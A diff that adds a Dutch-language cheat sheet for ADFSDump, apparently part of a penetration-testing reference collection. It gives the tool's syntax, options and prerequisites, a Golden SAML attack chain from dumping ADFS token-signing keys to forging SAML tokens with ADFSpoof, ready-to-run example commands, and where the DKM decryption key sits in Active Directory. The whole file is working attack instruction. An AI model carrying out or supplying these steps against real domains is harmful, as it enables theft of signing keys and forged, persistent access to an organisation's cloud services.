@@ -1,0 +1,40 @@
+# ADFSDump — ADFS configuratie en token signing keys dumpen
+# Extraheer ADFS signing keys en trust configuratie voor token forgery (Golden SAML)
+#
+# === Syntax ===
+# ADFSDump.exe /domain:DOMAIN /server:ADFS_SERVER [opties]
+#
+# === Wat wordt gedumpt ===
+# - DKM (Distributed Key Manager) decryptie sleutel uit AD
+# - Token signing certificaten (publiek + prive)
+# - Token encrypting certificaten
+# - Relying party trust configuratie
+#
+# === Belangrijkste opties ===
+# /domain:DOMAIN        Doeldomein
+# /server:SERVER        ADFS server hostname
+# /nokey                Sla DKM key ophalen over
+# /output:DIR           Uitvoermap
+#
+# === Vereisten ===
+# - Domein Admin of DA-equivalent rechten
+# - Toegang tot de ADFS server (WID of SQL)
+# - DKM container leesrechten in AD
+#
+# === Aanvalsketen (Golden SAML) ===
+# 1. Dump ADFS config met ADFSDump
+# 2. Extraheer signing certificate private key
+# 3. Smeed SAML token met bijv. ADFSpoof
+# 4. Gebruik token voor toegang tot cloud diensten
+#
+# === Voorbeelden ===
+# -- Volledige dump --
+ADFSDump.exe /domain:DOMAIN /server:ADFS_SERVER
+ADFSDump.exe /domain:DOMAIN /server:ADFS_SERVER /output:C:\temp\adfs
+# -- Alleen certificaten (geen DKM) --
+ADFSDump.exe /domain:DOMAIN /server:ADFS_SERVER /nokey
+# -- Vervolg: Golden SAML met ADFSpoof (Python) --
+# python ADFSpoof.py -b blob.bin DOMAIN ENDPOINT -s saml_token.xml
+# -- DKM key locatie in AD (handmatig) --
+# CN=ADFS,CN=Microsoft,CN=Program Data,DC=DOMAIN,DC=LOCAL
+# Attribuut: thumbnailPhoto bevat de DKM key
